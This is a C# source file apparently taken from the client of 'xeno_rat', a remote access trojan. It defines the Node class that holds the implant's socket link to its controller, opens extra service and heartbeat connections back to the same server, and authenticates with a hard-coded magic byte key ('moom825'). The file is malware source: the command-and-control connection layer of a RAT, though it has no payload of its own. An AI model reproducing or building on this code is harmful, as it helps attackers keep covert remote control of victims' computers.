using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    public class Node
    {
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);
        
        private Action<Node> HandleServiceStop;
        public List<Node> serviceConnections = new List<Node>();
        public SocketHandler sock;
        public Node Parent;
        public int ID = -1;
        public int SetId = -1;
        public int connectionType = -1;
        public Node(SocketHandler _sock, Action<Node> _HandleServiceStop)
        {
            sock = _sock;
            HandleServiceStop = _HandleServiceStop;
        }
        public void AddSubNode(Node subNode) 
        {
            serviceConnections.Add(subNode);
        }
        public async void Disconnect()
        {
            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock.sock?.Close(0);
            }
            sock.sock?.Dispose();
            List<Node> copy = serviceConnections.ToList();
            serviceConnections.Clear();
            foreach (Node i in copy)
            {
                i?.Disconnect();
            }
            copy.Clear();
            if (HandleServiceStop != null)
            {
                HandleServiceStop(this);
            }
        }


        public async Task<Node> InitializeConnectionAsync(int type, int retid, Action<Node> HandleServiceStop = null)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                await socket.ConnectAsync(sock.sock.RemoteEndPoint);

                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.securityKey, type, ID, HandleServiceStop);
                byte[] byteRetid = new byte[] { (byte)retid };
                await sub.SendAsync(byteRetid);
                byte[] worked = new byte[] { 1 };
                await SendAsync(worked);
                return sub;
            }
            catch
            {
                byte[] worked = new byte[] { 0 };
                await SendAsync(worked);
                return null;
            }
        }
        public bool Connected() 
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }
        public async Task<byte[]> ReceiveAsync()
        {
            byte[] data = await sock.ReceiveAsync();
            if (data == null)
            {
                Disconnect();
                return null;
            }
            return data;
        }
        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                Disconnect();
                return false;
            }
            return true;
        }
        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }
        public void SetRecvTimeout(int ms) 
        {
            sock.SetRecvTimeout(ms);
        }
        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }
        public async Task<bool> AuthenticateAsync(int type, int id = 0)//0 = main, 1 = heartbeat, 2 = anything else
        {
            byte[] data;
            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
            try
            {
                sock.SetRecvTimeout(5000);
                data = await sock.ReceiveAsync();
                if (!await sock.SendAsync(data))
                {
                    return false;
                }
                data = await sock.ReceiveAsync();
                sock.ResetRecvTimeout();
                if (ByteArrayCompare(comp, data))
                {
                    byte[] _connectionType = sock.IntToBytes(type);
                    if (!(await sock.SendAsync(_connectionType)))
                    {
                        return false;
                    }
                    if (type == 0)
                    {
                        data = await sock.ReceiveAsync();
                        int connId = sock.BytesToInt(data);
                        ID = connId;
                    }
                    else
                    {
                        ID = id;
                        byte[] connId = sock.IntToBytes(id);
                        if (!(await sock.SendAsync(connId)))
                        {
                            return false;
                        }
                    }
                    connectionType = type;
                    return true;
                }
            }
            catch
            {

            }
            return false;
        }
    }
}
